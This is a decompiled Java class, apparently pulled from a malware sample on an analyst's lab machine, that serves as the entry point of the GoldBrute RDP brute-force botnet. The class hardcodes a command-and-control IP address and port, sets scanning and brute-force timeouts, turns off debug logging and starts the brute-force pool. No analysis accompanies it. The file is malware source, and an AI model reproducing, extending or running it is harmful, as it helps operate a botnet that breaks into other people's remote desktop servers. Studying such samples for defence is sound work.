/*    */ package rdp.gold.brute.version;
/*    */ 
/*    */ import rdp.gold.brute.pool.GoldBrute;
/*    */ 
/*    */ public class Console
/*    */ {
/*  7 */   private static final org.apache.log4j.Logger logger = org.apache.log4j.Logger.getLogger(Console.class);
/*    */   
/*    */   public void run(String[] args) {
/*    */     try {
/* 11 */       rdp.gold.brute.Config.runAutoconfigureThreads();
/* 12 */       rdp.gold.brute.Config.HOST_ADMIN = "104.156.249.231";
/* 13 */       rdp.gold.brute.Config.PORT_ADMIN = 8333;
/*    */       
/* 15 */       rdp.gold.brute.Config.BRUTE_TIMEOUT = Integer.valueOf(11000);
/* 16 */       rdp.gold.brute.Config.SCAN_CONNECT_TIMEOUT = Integer.valueOf(2000);
/* 17 */       rdp.gold.brute.Config.SCAN_SOCKET_TIMEOUT = Integer.valueOf(2000);
/*    */       
/* 19 */       rdp.gold.brute.Config.BRUTE_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(5000);
/* 20 */       rdp.gold.brute.Config.SCAN_CONNECT_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(1000);
/* 21 */       rdp.gold.brute.Config.SCAN_SOCKET_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(1000);
/*    */       
/* 23 */       rdp.gold.brute.Config.IS_ENABLE_DEBUG = Boolean.valueOf(false);
/* 24 */       rdp.gold.brute.Config.LOG_PATH = "";
/*    */       
/* 26 */       rdp.gold.brute.Config.init();
/*    */       
/* 28 */       GoldBrute goldBrute = new GoldBrute();
/* 29 */       goldBrute.start();
/*    */     } catch (Exception e) {
/* 31 */       System.err.println(e.getMessage());
/* 32 */       System.exit(0);
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\version\Console.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */